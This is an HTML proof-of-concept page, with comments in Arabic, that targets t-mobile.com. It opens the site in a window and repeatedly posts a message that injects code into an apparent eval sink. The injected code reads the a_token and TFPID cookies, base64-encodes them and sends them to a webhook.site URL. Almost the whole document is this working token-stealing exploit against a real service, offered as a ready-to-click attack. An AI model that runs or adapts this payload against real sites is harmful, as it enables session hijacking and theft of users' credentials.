<!doctype html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>T-Mobile Exploit - Eval Sink</title>

<body style="background: #000; color: #e20074; text-align: center; padding-top: 50px; font-family: monospace;">

    <h1>Critical Vulnerability Found: Eval Sink</h1>
    <button onclick="pwn()" style="padding: 20px; background: #e20074; color: white; border: none; cursor: pointer;">Execute Attack</button>
    <div id="status" style="color: #00ff00; margin-top: 20px;"></div>

<script>
    const webh = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";

    function pwn() {
        const vic = window.open('https://www.t-mobile.com/', 'victim');
        document.getElementById('status').innerText = "Target Opened. Triggering Ajax Sync...";

        // الـ Payload هنا بيحاول يكسر الـ JSON اللي راجع في الـ eval
        // إحنا بنبعته في الـ action لأن الكود بيجمعه في السلسلة النصية
        const exploitPayload = {
            "type": "qm-sync", 
            "details": {
                // محاولة حقن كود داخل الـ action اللي هيروح للـ AJAX
                "action": "createNew'); const k=['a_token','TFPID']; const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|'); fetch('" + webh + "/?eval_pwn=' + btoa(d)); //",
                "postParams": "v=1"
            }
        };

        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            // إرسال كـ String لضمان دخولها في الـ JSON.parse بتاعهم ومنه للـ Ajax function
            vic.postMessage(JSON.stringify(exploitPayload), "*");
            
            if (attempts > 10) clearInterval(interval);
        }, 3000);
    }
</script>
